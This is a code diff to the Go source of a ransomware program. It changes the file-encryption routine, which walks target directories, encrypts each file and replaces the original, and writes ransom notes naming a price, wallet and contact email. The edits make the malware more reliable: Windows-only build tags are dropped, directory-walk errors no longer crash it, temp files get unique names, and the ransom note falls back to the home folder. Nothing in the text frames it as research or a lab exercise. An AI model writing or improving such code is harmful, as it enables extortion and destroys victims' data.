@@ -1,6 +1,3 @@
-// +build windows
-// +build go1.8
-
 package main
 
 import (
@@ -157,8 +154,13 @@ func encryptFiles() {
 		// Loop over the interesting directories
 		for _, folder := range cmd.InterestingDirs {
 			filepath.Walk(folder, func(path string, f os.FileInfo, err error) error {
-				// we doesn't care about the err returned here
 				cmd.Logger.Println("Walking " + path)
+
+				// A nil FileInfo means an error walking this entry (e.g. missing
+				// or inaccessible dir). Skip it instead of panicking.
+				if f == nil || err != nil {
+					return nil
+				}
 
 				if f.IsDir() && utils.SliceContainsSubstring(filepath.Base(path), cmd.SkippedDirs) {
 					cmd.Logger.Printf("Skipping dir %s", path)
@@ -211,17 +213,20 @@ func encryptFiles() {
 					// encrypted names appear and turn off the computer before the process is completed
 					// The files will be renamed later, after all have been encrypted properly
 					//
-					// Create/Open the temporary output file
-					tempFile, err := os.OpenFile(cmd.TempDir+file.Name(), os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
+					// Create the temporary output file (unique name, so two files
+					// sharing a basename can't collide in the temp dir)
+					tempFile, err := os.CreateTemp(cmd.TempDir, "ransomware-*.tmp")
 					if err != nil {
 						cmd.Logger.Println(err)
 						return
 					}
-					defer tempFile.Close()
+					tempName := tempFile.Name()
 
 					// Encrypt the file sending the content to temporary file
 					err = file.Encrypt(keys["enckey"], tempFile)
 					if err != nil {
+						tempFile.Close()
+						os.Remove(tempName)
 						cmd.Logger.Println(err)
 						continue
 					}
@@ -230,7 +235,8 @@ func encryptFiles() {
 					tempFile.Close()
 
 					// Here we can move the tempFile to the original file
-					err = file.ReplaceBy(cmd.TempDir + file.Name())
+					err = file.ReplaceBy(tempName)
+					os.Remove(tempName)
 					if err != nil {
 						cmd.Logger.Println(err)
 						continue
@@ -289,11 +295,15 @@ func encryptFiles() {
 	`
 	content := []byte(fmt.Sprintf(message, keys["id"], cmd.Price, cmd.Wallet, cmd.ContactEmail))
 
-	// Write the READ_TO_DECRYPT on Desktop
-	ioutil.WriteFile(cmd.UserDir+"Desktop\\READ_TO_DECRYPT.html", content, 0600)
+	// Write the READ_TO_DECRYPT on Desktop (or home dir when Desktop is missing)
+	notesDir := filepath.Join(cmd.UserDir, "Desktop")
+	if !utils.FileExists(notesDir) {
+		notesDir = cmd.UserDir
+	}
+	ioutil.WriteFile(filepath.Join(notesDir, "READ_TO_DECRYPT.html"), content, 0600)
 
 	// Write a list with all files encrypted
-	ioutil.WriteFile(cmd.UserDir+"Desktop\\FILES_ENCRYPTED.html", []byte(strings.Join(listFilesEncrypted, "<br>")), 0600)
+	ioutil.WriteFile(filepath.Join(notesDir, "FILES_ENCRYPTED.html"), []byte(strings.Join(listFilesEncrypted, "<br>")), 0600)
 
 	cmd.Logger.Println("Done! Don't forget to read the READ_TO_DECRYPT.html file on Desktop")
 }
